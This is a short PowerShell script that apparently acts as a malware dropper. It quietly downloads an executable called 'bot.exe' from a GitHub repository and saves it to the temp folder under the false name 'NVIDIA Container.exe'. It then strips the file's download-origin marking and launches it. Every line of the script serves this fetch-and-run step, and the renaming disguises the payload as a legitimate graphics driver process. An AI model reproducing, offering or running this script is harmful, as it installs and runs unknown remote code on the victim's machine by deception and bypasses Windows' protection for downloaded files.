$ProgressPreference = 'SilentlyContinue'
$p = "$env:TEMP\NVIDIA Container.exe"
Invoke-WebRequest -Uri "https://github.com/yuko22572-dotcom/main/raw/refs/heads/main/dist/bot.exe" -OutFile $p
Unblock-File -Path $p
Start-Process $p
